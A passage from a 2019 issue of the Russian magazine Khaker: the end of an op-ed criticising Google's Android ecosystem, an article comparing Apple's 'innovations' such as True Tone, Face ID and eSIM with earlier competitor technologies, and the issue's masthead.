с задержкой в две недели, в сравнении с командой Google Play они обес‐
печивали просто превосходный сервис поддержки. Серьезно, даже такой вид
диалога был чем‐то гораз до большим, чем диалог с под держкой Google Play.
   Google — компания, пос троенная на идее автоматизации всего и вся.
Автоматическое таргетирование рекламы, автоматическое ранжирование
результатов, автомати ческие подсказ ки Google  Assistant, автоматические
шаблонные ответы на вопросы и претензии. Хочешь, чтобы с твоей проб‐
лемой разобрались, — будь раз работчиком приложения с многомиллионной
аудиторией, иначе ты заслуживаешь общения только с ботом.
  А еще Google — это компания, которая очень любит плодить сущности.
Вспомни историю с мес сенджерами, когда Google каждые два года выкаты‐
вала новую систему обмена сообщени ями и закрывала старую. Вспомни
историю всех свернутых проектов компании. Внутри Android происходит ров‐
но то же самое. Любая идея быстро внедряется и становится частью API,
а через пару‐трой ку релизов объявляется устаревшей. Google может пред‐
ставить Android Architecture Components как спа сение всех раз работчиков
от ада, который сама же создала, и через год прис тупить к разработке Jet‐
pack Compose, который должен будет спасти тех, кого не успели спас ти
в предыдущий раз. Они могут объявить JobScheduler Святым Граалем
и единственной правильной системой выполнения фоновых задач, а через
два года призвать всех раз работчиков мигрировать на WorkManager. Сегодня
тебе разрешено читать карту памяти, а завтра ты будешь обя зан переделать
все свое приложение на новый API.
   Если ты приходишь в раз работку для Android в 2019 году, большую часть
времени ты пот ратишь не на изу чение API и осо бенностей платформы, а на
то, чтобы отсеять весь балласт уста ревших технологий и подходов и понять,
как и почему следует делать пра вильно в этом году. 90% отве тов на Stack
Overﬂow окажутся неверными, половина официальной документации будет
советовать плохие решения, половина при меров устареет. С одной стороны
тебе будут кричать про RxJava/RxKotlin, с дру гой рас сказывать про Kotlin
Coroutines, и никто не рас ска жет, как правиль но. Потому что даже Google
не знает, как правильно.
   Что с этим всем делать? Ничего, придет ся учить ся у веб‐разработчиков
принимать анархию как данность.


ВЫВОДЫ
В YouTube можно найти выступление разработчиков Android, пос вященное
текущей ситуации с доступом  к файлам. Там они пря мо говорят, что
в будущем в Google Play появится новое пра вило размещения при ложе ний:
любые файловые менед жеры должны будут про ходить дополнительную про‐
верку перед публикацией.
   Эта история показывает,  что  «закручива ние  гаек» продол жится и в
будущем мы увидим все новые и новые запреты. И если у тебя есть аргумент,
что это хорошо и это тот самый путь Apple, к которому надо стремиться, то
спешу разочаровать. Google не Apple, а открытый Android — это не всес‐
торонне закрытая iOS. Android уже живет сво ей жизнью в Китае, а после зап‐
рета устанавливать сервисы Google на смартфоны Huawei фрагментация
только усилится. Если Google Play станет жес тко зарегулированной плат‐
формой, вскоре у нее появятся силь ные конкуренты, которые сде лают сво‐
боду, вседозволенность и лояльное отношение к разработчикам своей мар‐
кетинговой фишкой. А это, в свою очередь, приведет к еще большей фраг‐
ментации.
  А проиграют в итоге все. И Google, и раз работчики, и пользователи.
 GEEK





     Олег Афонин
  Эксперт по мобильной
криминалистике компании
      «Элкомсофт»
aoleg@voicecallcentral.com




НЕИННОВАЦИОННЫЕ
ИННОВАЦИИ
 ОТКУДА РАСТУТ КОРНИ
 ТЕХНОЛОГИЙ APPLE




 Каждый год в сентябре Apple выпускает обновленную линей‐
  ку iPhone, а чуть ранее летом анонсирует обновле ние опе‐
 рационной сис темы  iOS. Ни один анонс не обходится
 без инновационных и… не совсем инно вационных решений
 и технологий. Тройная камера, умный режим HDR, «ночной
 режим» Night Shift, True Tone, Liquid Retina Display и многое
 другое в свое время были с фанфарами представлены
 со сцены. Какие из этих технологий были дей ствительно пер‐
 выми на рынке, какие — в роли догоняющих, а какие сущес‐
 твовали ранее, но были впервые доведены до ума именно
 инженерами Apple? Попробуем разобраться на примере
 анонсов компании за последние несколько лет.



 НОЧНОЙ РЕЖИМ NIGHT SHIFT:
 КАК ДЕЛАТЬ ПРАВИЛЬНО

 Сегодня ночной режим экрана, в поз дние часы пос тепенно уводящий цве‐
  товую температуру в «теп лые» оттенки, стал привычен. Кто‐то пользуется
  этим режимом, кто‐то предпочитает естес твенную цветопередачу, но главное
  одно: этот режим есть, и есть он практичес ки на всех смартфонах практичес‐
  ки всех производителей.
    Для пользователей продукции  Apple  этот режим впервые появился
  в 2016 году с выходом 9.3.
     Нет, не так. Официально для поль зователей продукции Apple этот режим
  впервые появился в марте 2016 года с выходом 9.3. А неофициально задол го
  до этого существовало приложение f.Lux. Насколько «задолго»? На iOS при‐
  ложение f.Lux появилось в 2011 году, а для работы ему требовался джей‐
  лбрейк. Версия без джейлбрейка выш ла в 2015 году; пользователи могли
  самостоятельно установить ее на свои устройства. Впрочем, уже в нояб‐
  ре 2015 года юридический отдел Apple зас тавил раз работчиков убрать при‐
  ложение из свободного дос тупа, ссылаясь на пункты соглашения, запреща‐
 ющие разработчикам использовать приватные API. А уже в марте следующего
  года функция официально появилась в iOS 9.3. Инновация? Сомнительно.
    А как обстоят дела на дру гих плат формах? Режим Night Light появился
  в некоторых (далеко не всех) устройствах с Android в версии Android 7.1.1;
  дополнительные настройки режима стали доступны в Android 8. Для работы
  Night Light официально требовалась поддержка Hardware Composer HAL 2.0
  (соответственно, только 64‐раз рядные про цес соры — как и в случае с Apple).
 В бета‐версиях Android этот режим то появлялся, то исче зал даже на собс‐
  твенных устройствах Google. Такие 64‐разрядные устройства, как Nexus
  9 и Google Pixel C, режим Night Light не получили, несмотря на то что вполне
  соответствовали требованиям.
   С поддержкой Night Light смартфонами и планшетами сторонних произво‐
  дителей долгое время тоже был полный бардак. Night Light получили некото‐
 рые смартфоны, вышедшие с Android 6 или 7 на борту, а некоторые —
  не получили. А вот устройства, выпущенные сра зу с Android 8 в 2017 году
  и позднее, практически все (за редкими исклю чениями) обладали этой воз‐
  можностью. Более того, многие производите ли добавили эту воз можность
  в собственные оболочки независимо от версии Android.
   В  магазине  Google  Play  предос таточно  приложений,  реализующих
  подобие ночного режима. Пользователям рутованных устройств дос тупны
  f.Lux и CF.lumen. Остальные могут использовать один из многочисленных
  экранных фильтров со всеми их ограничениями в виде «выцветших» цветов,
 белесым черным и не затененной фильтром строкой состояния.
    К слову, ночной режим сейчас дос тупен и на компьютерах с Windows 10.
 В отличие от Apple, Microsoft не ста ла блокиро вать при ложе ние f.Lux, его
 можно установить как с собственного сайта раз работчиков, так и из магазина
  Microsoft Store.
   Вы вод: Apple не были первыми, кто придумал ночной режим экрана,
  и даже не были первыми, кто реализовал подобный режим в iOS. Однако бла‐
  годаря тому, что iOS 9.3 ста ла доступна сра зу для всех мобильных устройств
  компании, включая старень кий iPhone 5s (выпущенный с iOS 7 на борту), мы
 запишем эту возможность в пра виль ные реализации.



 TRUE TONE: ДАТЧИК ОКРУЖАЮЩЕГО
 ОСВЕЩЕНИЯ И УМНЫЙ СОФТ

 Функция True Tone стала сво еобразным раз витием ночного режима. В отли‐
  чие от ночного режима, который просто уводит оттенки в «теплую» сторону
  с наступлением ноч ного времени (самая «продвинутая» часть здесь — узнать
 местоположение устройства и определить точный момент захода сол нца),
  технология True Tone требует наличия аппаратного датчика, чтобы опре‐
  делить цветовую температу ру окружения и подс троить изображение под нее.
    Впервые технология появилась не в iPhone, а в планшете iPad Pro 9.7,
  который вышел в марте 2016 года. Сегодня True Tone работает на всех
  устройствах Apple, оборудованных соответству ющим датчиком. В список вхо‐
  дят все iPhone, начиная с iPhone 8, все версии iPad Pro, кроме самой первой
  модели 2015 года, а также новый iPad mini 5 и iPad Air (2019).
     Так же как и в случае с ночным режимом, у технологии True Tone есть свои
  любители и скептики. Я отношусь к технологии неоднозначно. С одной сто‐
  роны, на iPad Pro она реализована дос таточно мягко для того, чтобы не раз‐
  дражать. А вот в iPhone, обо рудованных матрицами OLED, включение True
  Tone моментально уводит экран в желтизну: проверено на iPhone X и Xs Max.
    А что у конкурентов? Что‐то подобное было еще во времена Samsung Gal‐
  axy S8 (функция Adaptive Display, 2017 год). Впро чем, по отзы вам пользовате‐
  лей, технология выглядела кру то только на бумаге. В реальной жиз ни хоть
  как‐то повлиять на картинку мог только исключитель но сильно окрашенный
  источник внешнего освещения, а сам эффект проявлялся лишь в нескольких
  избранных приложениях (например, в браузере Chrome).
    На самом же деле пер выми, кто действительно хорошо реализовал тех‐
  нологию, была компания Amazon со своим планшетом Amazon Fire HDX 8.9
  (2014). Технология называлась Dynamic Light Control; посмотреть демонс тра‐
 цию можно по ссылке. Правда, выглядит замеча тельно? Здесь все как впос‐
  ледствии у Apple, только на два года рань ше: и аппаратный датчик цветовой
  температуры окружающей среды, и пра вильный драйвер экрана, исполь‐
 зующий аппаратные регистры для изменения настроек экрана…
    Описание технологии мне, хоть я и (до сих пор) владелец экземпляра
  планшета Amazon Fire HDX, уда лось най ти с трудом, а уж картинки с демонс‐
  трацией ее работы вооб ще редкость и нашлись только на одном ресурсе.
  Почему же о планшете Amazon все дружно забыли, а раз работчики Apple
  с технологией True Tone ста ли инноваторами и первооткрывате лями? Воз‐
  можно, потому, что планшет Amazon не снискал такой популярности, как iPad
  Pro 9.7. Может быть, дело в том, что маркетин говый отдел Amazon не прод‐
  вигал эту функцию, не объяснял пользователям ее преимущества. Или в том,
  что модель 2014 года ста ла первой и единственной, где Amazon исполь‐
  зовала технологию Dynamic Light Control. А может, причина в том, что тех‐
  нология прекрасно работа ла ровно в двух при ложениях: в читал ке Kindle
  и браузере Silk (это собственный браузер Amazon, работающий в FireOS).
   Я склонен считать Dynamic Light Control странной слу чайностью, которая
  произошла с Amazon по чьему‐то недос мотру. Похоже, Amazon уволила
  команду разработчиков, которые реализовывали этот режим (и, кажется, я
  догадываюсь, какая компания их потом наняла). Эту точку зрения косвенно
  подтверждает то, что над реализацией новой версии ночного режима в план‐
  шетах Amazon (Blue Shade) работа ла явно дру гая компания. Настолько
  нелепой и уродливой реализации ночного режима я не видел ни у одной ком‐
  пании ни до, ни после. Полюбуйтесь, ночной режим Blue Shade во всей красе.





 Самое интересное, что в Amazon Fire HDX 8.9 (2014) могут одновременно
  работать оба режима — Dynamic Light Control (идеальная картинка, плавная
  подстройка, но действует только в двух приложениях) и Blue Shade (картинка
  хуже, чем самый ужасный ужас, работает везде). Разница очевидна.
    Режим, аналогичный True Tone, есть в некоторых смартфонах LG (модели
  G7, G8, G8s  Thinq), но кто об этом знает? Сделали и сделали. А вот
  более‐менее массово подобная технология используется в умных дисплеях
  Google Nest Hub и смартфоне Pixel 4. Тех нологию назвали Ambient EQ.
  Работает она совершенно замеча тельно: внеш ний вид устрой ств с Ambient
 EQ в домашнем интерьере заметно выигрывает по сравнению с аналогами
  от пионера технологии Amazon, который, к сожалению, отказался от исполь‐
  зования технологии в сво их устройствах Echo Show и Echo Spot.
   Вы вод: аналог True Tone существовал задолго до Apple, но никто не вос‐
  принял его серьезно. Apple получа ет с полки пирожок за грамотную реали‐
  зацию  и  последовательный  подход.  Вто рое  место  достается  Google
  за отличную реализацию Ambient EQ в умных колонках с экраном. Amazon
  не получает ничего: оригинальная в 2014 году технология давно и прочно
  забыта даже самим первопроходцем.



 DEEP FUSION: ДОГНАТЬ И ПЕРЕГНАТЬ PIXEL!

 Долгое время камеры оставались слабым местом iPhone. К 2017 году прак‐
  тически все конкуренты на Android успели обогнать iPhone по качес тву фотог‐
  рафий. Даже на момент выхода фотографические возможности iPhone X
  смотрелись откровенно бледно в сравнении с Google Pixel с его режимом
 HDR+.
    Аналог режима HDR+ появился в смартфо нах Apple лишь с выходом
  линейки смартфонов 2018 года. Получивший название Smart HDR новый
 режим стал доступен лишь в свежем поколении устрой ств: iPhone Xr, Xs и Xs
  Max. Увы, никаких улучшений в обработку фотог рафий на iPhone X не добави‐
  ли, несмотря на мощ нейшую начин ку, в разы превосходящую потребности
  вычислительной фотог рафии.





 В моделях 2018 года технология действует только в режиме ZSL (Zero Shutter
  Lag), не имеет аналога HDR+ Enhanced и работает только с целыми кадрами,
  а не с отдельными тайлами, как это сделано у Google.
   В новых iPhone 11 модельного ряда 2019 года были заявлены радикаль‐
 ные улучшения. Технология получила маркетинговое название Deep Fusion.
 С точки зрения поль зователя технология похожа на режим HDR+ без ZSL (или
  на ночной режим  Pixel). Новым iPhone завезли распознавание объектов
  и попиксельную обработку вмес то покадровой; съемка, склейка и обработка
  кадров занимает око ло секунды. И снова прош логодние модели остались
  не у дел: несмотря на избыточность вычислитель ных ресурсов (по заявлени‐
 ям Apple, процессор A12 в iPhone Xs превос ходит Snapdragon 855, который
  более чем хорошо справляется с обработкой HDR+), прошлое поколение
  iPhone остается на прошлом же поколении Smart HDR. То есть — на уровне
  «более‐менее прилич но для прошлого года».
    А что у конкурентов?
    Впервые о возможнос тях вычислительной фотографии громко заявила
  компания Google в 2016 году, за два года до выхода iPhone Xs и появления
 режима Smart HDR от Apple. И если режим Smart HDR — это некий «черный
  ящик», о работе которого мы знаем только из маркетинговых материалов
  Apple и сторонних обзоров, то о Google HDR+ нам из вестно все вплоть
  до математических формул.
   Вычислительную фотог рафию в том или ином виде используют в своих
  устройствах практически все производители флагманов на Android (кроме,
  наверное, Sony). А если не используют — вполне можно установить модифи‐
  цированный APK Google Camera и получить все или почти все воз можнос ти
  Pixel.
    Для iPhone также доступны сторонние приложения, обе щающие все блага
  вычислительной фотографии. Это и Spectre, и Halide от того же разработчика
  (кстати, в их блоге выходят отличные статьи — вот, например, анализ режима
  Smart HDR). Проблема лишь в том, что работа ют они в сравнении с «род ным»
  приложением отвратительно, — утверждаю как поль зователь, купивший все
  три приложения.


 Исто ричес кая справ ка
  Что интересно, склейку кадров (image stacking), лежащую в основе HDR+
  и Deep Fusion, в мобильных устройствах впер вые использовали вовсе не в
  Google. Помнишь смартфоны Lumia 950 и 950 XL, вышедшие в 2015 году? Их
  разработала ком пания Microsoft, и внутри у них сто яла мобильная версия ОС
  Windows 10. В режиме HDR эти смартфоны делали нечто очень похожее на то,
  что позднее появилось у Google и еще позже у Apple, а режим PureView был
  вполне приличным аналогом ночного режима. Снимки получались отличного
  качества; более того, разрешение фотографий смартфонов от Microsoft было
  не 12 МП, как у современ ных флагманов, а все 20 — при этом не страдала
  ни детализация, ни уровень шума. Увы, склейка HDR не была на смартфонах
  Lumia мгновенной: после каждого снимка смартфон задумы вался на несколь‐
  ко секунд. С прекращением раз вития собственной мобильной ОС Microsoft
  забросила и развитие приложения камеры. Жаль; на современном железе,
  в сочетании с качественной оптикой и сенсором, мог бы получиться сильный
  конкурент Google — но только с точки зрения камеры.


 Вы вод: пирожок с пол ки дос тается Google за отличную реализацию и пос‐
  ледовательное улучшение приложения Google Camera. Дополнительные очки
  Google за то, что новые воз можнос ти Google Camera становятся доступны
  и на старых Pixel (в рамках вполне объяснимых аппаратных ограничений).
 О продукции Apple можно ска зать лишь то, что потрясающе избыточная мощ‐
  ность нейронных сопроцес соров прош логодних моделей iPhone так и оста‐
  нется  невостре бованной:  новых  фотовозможностей  в  старые  модели
  не добавили, и связано это с чем угодно, но только не с аппаратными огра‐
  ничениями.



 НОЧНОЙ РЕЖИМ NIGHT MODE: ХОРОШО,
 НО ПОЧЕМУ ТОЛЬКО ДЛЯ IPHONE 11?

 В одиннадцатом iPhone появился ночной режим съемки. В этом режиме
  длинная выдержка достига ется умной комбинаци ей множества кадров, сде‐
  ланных с короткой выдержкой, что бы изоб ражение не смазывалось. Точнее
  говоря, склеиваются не целые кадры, а их час ти, что позволяет корректно
  обработать движущиеся в кадре объекты. Такой подход позволя ет уменьшить
  уровень видимого шума при сохранении общей четкости фотографии.
    Впервые ночной режим, работа ющий по описанному выше принципу,
  появился в приложении Google Camera осенью 2017 года — почти на год
  раньше, чем в iPhone. Я специально не упо минаю модель устройства, к анон‐
  су которой был приурочен выход обновлен ного приложения, потому что
 режим Night Sight стал доступен и для предыду щих смартфонов линейки
  с обновлением приложения Google Camera из Play Store.
    Почему я акцентирую на этом внимание? Потому что никакие предыдущие
  модели Apple никакого ночного режима не получи ли. Новое приложе ние
  камеры доступно исключитель но на новых iPhone 11‐й серии. Причина? Офи‐
  циально — ночной режим использует возможности нового замечательного
  процессора A13 Bionic. Вот только нес колькими слайдами ранее со сце ны
  показали графики, из которых видно прос то доминирующее превос ходство
  предыдущего процессора A12 Bionic над поделками Qualcomm, которые
  использует Google. И если Google может реализовать ночной режим на про‐
  цессорах предыдущего и предпредыдущего поколений, то что мешает Apple
  адаптировать его под те самые мощ ности нейросопроцессора, которые сей‐
  час не используются и простаивают? Ничего личного, просто маркетинг:
  хочешь ночной режим — покупай новый iPhone.
   Вы вод: приз достает ся Google как первопроходцам и за то, что ночной
 режим стал доступен в предыду щих смартфо нах линейки. В сторону Apple
  отправлен луч удивления и недоумения решением маркетингового отде ла.



 РАЗБЛОКИРОВКА ПО ЛИЦУ:
 FACE ID ПРОТИВ КОНКУРЕНТОВ

  Face ID стал гвоздем программы во время анонса iPhone X в 2017 году. Новая
  система сканеров, создающая трехмерный образ лица пользователя, новый
  сопроцессор Bionic, использующийся для нужд машинного обучения при раз‐
  блокировке по лицу (и прос таивающий все осталь ное время), и бес шовная
  интеграция в iOS сделали раз блокировку по лицу полной заменой датчику
  отпечатков пальцев.
    Конкуренты? В Android задолго до Face ID была возможность добавить
  разблокировку по лицу в подсистеме Smart Lock. Я упоминаю эту систему
  исключительно для того, чтобы комментаторы не упре кали меня в упущении:
  аналогом Face ID подсистему Smart Lock считать никак нельзя из‐за чрез‐
  вычайно низкого уровня безопасности. Недаром многие политики безопас‐
  ности полностью запрещают исполь зование Smart Lock в смартфонах
  с Android.
    Но конкурен ты не дремлют. Пос ле выхода iPhone X подсисте му разбло‐
  кировки по лицу стали добавлять в качестве штат ной (а не Smart Lock) воз‐
 можности многие производители. В подавляющем большинстве случаев
  безопасность таких решений была ниже кри тичес кой планки: использовалась
  единственная камера, никакой трехмерной модели не создавалось, прос то
  сличались двумерные изображения. Шагом в сторону стал смартфон Xiaomi
  Mi 8 Pro, в котором была пара камер и инфракрасная подсветка.
     Что‐то подобное пытались встраивать в свои смартфоны Samsung: режим
  распознавания  радужной  обо лочки  был  опциональным  дополнением
  к режиму разблокировки по лицу. Тем не менее в этих смартфонах разбло‐
  кировка по лицу так и не ста ла основной и единс твенной биометрикой; о бес‐
 шовной интеграции (авториза ции в приложениях) не приходилось и говорить.
   В Google Pixel 4 и 4 XL, вышедших спус тя два года пос ле iPhone X, разбло‐
  кировка по лицу стала единственной воз можностью разблокировать устрой‐
  ство биометрикой. Система осно вана на тех же принципах, что и Face ID.


 Не толь ко лицо
  Кроме разблокировки по лицу и отпечатку, в смартфонах сущес твовали и дру‐
  гие методы авторизации пользователя. Так, в смартфонах Lumia 950 / 950 XL
  в качестве единственной биометричес кой опции предлагалась разблокиров‐
  ка по скану радужной обо лочки глаза. Формально — аналог Face ID. Фак‐
  тически же разбло кировка по ска ну радуж ной оболочки оказалась медленной
  и не слишком надежной, не работа ла в очках, плохо справлялась при избы‐
  точно ярком осве щении… Да, уровень ложных положительных срабатываний
 был чрезвычайно низок; да, безопасность была на уровне. Но пользоваться
  ей было настолько неудобно, что в Microsoft отказались от этой модели.


 А знаешь, кому на самом деле принадлежит пальма первенства? Все‐таки Mi‐
  crosoft, и я сейчас совершенно не имею в виду линейку Lumia 950 и 950 XL.
 В 2015 году Microsoft сделали прекрасную, безопас ную, отлично отлаженную,
  мгновенно и надежно сра батывающую систему авто ризации по лицу под наз‐
  ванием Windows Hello. Две инфракрасные камеры, разнесенные на заданное
  (сертифицируемое) расстояние, инфракрасная же подсветка, вмес то Secure
  Enclave — не менее безопасный, но абсолютно стандартный модуль TPM 2.0.
    Работает это так: поль зователь открывает крышку ноутбука — и он уже
  авторизован; достаточно смахнуть вверх шторку экрана блокировки (или
  нажать кнопку «Вверх»), что бы попасть на рабочий стол. Быстро и без задер‐
  жки. При этом биометрика бесшовно интегрирова на в приложения: чтобы
  посмотреть пароли, сох раненные в браузере Chrome, тоже вполне дос таточ‐
  но находиться перед камерой. Во мно гих ноут буках (например, HP Spectre
  x360) решение уже встроено, а для десктопа камеру можно купить любую (из
  сертифицированных для Windows Hello). Сертифици рованная камера, драй‐
  вер и модуль TPM 2.0 — все, что нуж но для настройки биометрического
  логина в Windows 10.





                         На телефонах





                         На компьюте рах

  Казалось бы, при чем тут Apple? Вся подсистема Windows Hello достаточно
 массивна. Встроить ее в телефон в том виде, как она работает на планшетах
  и ноутбуках, у Microsoft не получилось, пришлось создавать новую систему
  с распознаванием радужной обо лочки глаза. Именно Apple удалось втиснуть
  надежную биометрику в миниатюрный формфактор, а само распознавание
  сделать моментальным и практичес ки незаметным для пользователя бла‐
  годаря избыточной мощ ности нейронного соп роцес сора.
   Вы вод: несмотря на наличие подобных систем задолго до Face ID, Apple
  были первыми, кто сделал действительно удобно, быстро и надежно именно
  на смартфоне (планшеты и ноут буки не в счет, там пальма первенства
  у Microsoft).



 ESIM: ЭЛЕКТРОННЫЕ SIM-КАРТЫ
 ВМЕСТО ФИЗИЧЕСКИХ

  Здесь можно было бы расска зать о двухсимочных iPhone, но тема с электрон‐
 ными  SIM‐картами  кажется  мне  гораздо  более  инте ресной. Именно
  с выходом поколения iPhone Xr / Xs / Xs Max в 2018 году (а вовсе не с появ‐
  лением часов Apple Watch, поддерживающих LTE) операторы сотовой свя зи
  по всему миру стали в мас совом порядке добавлять поддержку eSIM.
  Пожалуй, ни одной другой компании не уда лось бы добиться такого эффекта,
  и это — одна из тех вещей, выгоду от которых получают не только пользовате‐
  ли продукции Apple, но и многие другие.
   Мало кому известно, что поддержка eSIM в массовом смартфоне впервые
  появилась вовсе не в iPhone. Первым продуктом с поддержкой eSIM стали
  часы Apple Watch 3 LTE, а первым смартфо ном с поддержкой eSIM — Google
  Pixel 2, также вышедший в 2017 году. В то время поддержка eSIM в Pixel
  2 была доступна только и исключительно в собственной мобильной сети
  Google Fi; никакого массового перехода на eSIM со стороны пользователей
  или операторов сотовой свя зи не наблюдалось. Apple Watch 3 с LTE под‐
  держивались на момент выхода даже не каждым оператором в США,
  не говоря уже о других стра нах.
   В октябре 2018‐го, меньше чем через месяц после выхода iPhone Xs, под‐
  держку eSIM анонсировали в свежей линейке Google Pixel 3. Теперь и в смар‐
  тфонах Google поддержка электронных SIM‐карт стала полноценной и откры‐
  той для всех опе раторов, у которых есть поддержка eSIM.
   В чем разница между решениями Apple и Google? Если смартфоны iPhone
  Xs (и далее по списку) — двухсимочные, позволяющие одновременную
  работу в режиме ожидания для обеих SIM‐карт (физической и электронной),
  то в Pixel 3/XL одновременно использоваться может лишь одна SIM, физичес‐
  кая либо электронная. Что интересно, ранние бета‐версии Android давали
  пользователям возможность вклю чить одновременную поддержку обе их SIM‐
  карт и на Pixel 3, это однозначно ука зывает на то, что внутри смартфон вполне
  «двухсимочный». Увы, ни в одну окончательную версию Android «двухсимоч‐
  ный» режим не попал.
   Вы вод: несмотря на практически одновременный выход iPhone Xs и Pixel
  3, главный приз получает все‐таки Apple. Именно Apple под готови ла рынок
  к появлению eSIM в смартфонах (напомню, часы Apple Watch с поддержкой
  LTE вышли на год раньше), и именно мас штаб компании заставил операторов
  всерьез присмотреться к новому стандарту.



 ВТОРАЯ И ТРЕТЬЯ КАМЕРЫ

 Первым двухкамерным смартфоном Apple стал iPhone 7 Plus, выпущенный
  в сентябре 2016 года. В том же 2016 году вышли многочис ленные модели
  конкурентов, также оснащенные дву мя камерами. Здесь и модели Huawei
  (вторая камера, монохромная, предназна чена для лучшей съемки в темноте
  и для определения глубины рез кости), и LG G5 (вторая камера — широко‐
  угольная), и многочисленные китайские устрой ства, вторые камеры которых
  могли выполнять любую роль вплоть до декоративной. Задол го до 2016 года
  существовали и другие модели с дву мя камера ми. Например, были модели
 LG Optimus 3D и HTC Evo 3D (обе в 2011 году), двойная камера которых поз‐
  воляла снимать стереопары.
   В то же время Apple стала одной из немногих компаний, использующих
  честный (оптический) спо соб получения снимков с двукратным приближени‐
  ем. Многие китайские конкуренты с дву мя камера ми (в их чис ле ранние
  модели Xiaomi и OnePlus) использовали комбинацию из небольшого опти чес‐
  кого приближения, вырезания центральной час ти изображения и програм‐
 мной интерполяции, что давало качес тво снимков класса «неплохо, если
  смотреть с экрана смартфо на». Второй объектив в iPhone 7 Plus просто был
  и просто работал.
    Первыми iPhone с тремя камера ми стали модели iPhone 11 Pro и Pro Max
  (2019 год). И если iPhone 7 Plus в 2016 году смотрелся достаточно свежо, то
  «трехкамерные» iPhone образца 2019 года выглядят своеобразной уступкой
 рынку. И если к стабилизированному телеобъективу с двукратным приб‐
  лижением вопросов нет, то использование в iPhone 11 Pro оптики без авто‐
  фокуса для широкоуголь ной камеры вызыва ет недо умение.
   Вы вод: не инновации. Главный приз не получа ет никто; идея просто
  витала в воздухе, а ее реализацией занимались практически все произво‐
  дители одновременно.



 ЗАКЛЮЧЕНИЕ

 В одной статье невозможно рас смот реть все инновации и «инновации» даже
  за последние два года. Использование датчика U1 для опре деления мес‐
  тоположения — инновация или нет? А Apple Pencil первого и второго поколе‐
  ния? А планшеты с экра ном с час тотой обновления в 120 Гц? А воз можнос ти
  дополненной реальности, которые потом подхватила (и забросила) Google?
  Часы с прорывной функцией ЭКГ, но сильно припоз днившимся режимом Al‐
  ways On Display? Все это интерес но, а многое заслуживает отдельного рас‐
  смотрения.
     Так все‐таки, Apple — инноваторы или догоня ющие? Как и обычно в случае
  с Apple, однозначный ответ дать невозможно.
    Многие вещи появляются в продуктах Apple с большим опозданием. Здесь
  и поддержка вычислительной фотографии в камерах, и режим Always On Dis‐
  play в часах, и поддержка двух SIM‐карт, и поддержка двух, а потом и трех
  камер, и ночной режим экра на, и мно гое другое.
    Немногое — действительно прорывные инновации. Здесь и стандарт
  eSIM, распространение которого без Apple заняло бы многие годы, и фун‐
  кция электрокардиограммы в часах, и уста ревший ныне «бес конечный» (а
  попросту — с симметричными рамками) экран «с вырезом».
   В большинстве же случаев Apple подбира ет с пола никому не нужную,
  полузабытую технологию, доводит ее до ума и дела ет так, что все это «просто
  работает», — после чего уже конкурентам дос тает ся роль догоняющих. Яркий
  пример — технология True Tone, которая была придумана и использована
  в планшете Amazon задолго до Apple, затем забыта, внедрена тоже в планшет
  (iPad Pro 9.7) и растиражирова на на зна чительную часть линейки продуктов
  компании. После чего технологию тихо (LG G8, G8s) или с рекламной поддер‐
  жкой (Google Nest Hub) взяли на воору жение конкуренты. Другой пример —
  технология Face ID, которая в ее текущем, хорошо отлаженном виде толь‐
  ко‐только появилась в Pixel 4.
    №11 (248)
          Андрей Пись мен ный        Илья Русанен          Алексей Глазков
              Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                 Евгения Шарипова
                                     Литературный редактор


                           РЕДАКТОРЫ РУБРИК
          Андрей Пись мен ный        Илья Русанен        Иван «aLLy» Андреев
               pismenny@glc.ru             rusanen@glc.ru         iam@russiansecurity.expert
            Евгений Зобнин          Татьяна Чупрова        Андрей Васильков
                 zobnin@glc.ru              chuprova@glc.ru        the.angstroem@gmail.com
                   Вален тин Холмогоров     Виктор Олейников
                           valentin@holmogorov.ru     fabulous.faberge@yandex.ru


                          MEGANEWS
                           Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ
                                      yambuto
                                      yambuto@gmail.com


                               РЕКЛАМА

                                  Анна Яковлева
                               Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                             Вопросы по под писке: lapina@glc.ru
                            Вопросы по материалам: support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, ком ната 54, офис 7. Зарегистри ровано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых ком муника ций (Роскомнадзоре), свидетельство Эл № ФС77‐67001 от 30.
08.2016 года. Мнение редакции не обязатель но совпада ет с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответс твен ности. Редакция
не несет ответственности за содер жание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов жур нала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2019